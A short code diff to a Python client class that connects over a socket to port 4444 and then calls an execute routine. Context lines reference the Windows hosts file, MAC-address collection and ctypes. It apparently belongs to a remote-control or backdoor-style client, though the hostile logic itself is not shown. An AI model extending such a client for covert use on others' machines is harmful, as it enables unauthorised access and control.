@@ -13,6 +13,10 @@ import numpy as np
 from ctypes import cast, POINTER
 import ctypes
 
+HOST = socket.gethostbyname(socket.gethostname())
+PORT = 4444
+ADDR = (HOST, PORT)
+
 MAC_ADDRESS = get_mac_address()
 LOCATION = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
 HOST_PATH = "C:\Windows\System32\drivers\etc\hosts"
@@ -46,8 +50,6 @@ class CCA_CLIENT:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.connect((self.host, self.port))
-                sending = socket.gethostbyname(socket.gethostname())
-                sock.send(sending.encode())
                 print(f"[*] Connected to host {self.host}:{self.port}")
                 break
             except:
@@ -163,7 +165,7 @@ class CCA_CLIENT:
 
 
 if __name__ == "__main__":
-    client = CCA_CLIENT("127.0.0.1", 4444)
+    client = CCA_CLIENT(HOST, PORT)
     try:
         client.start_connection()
         client.execute()
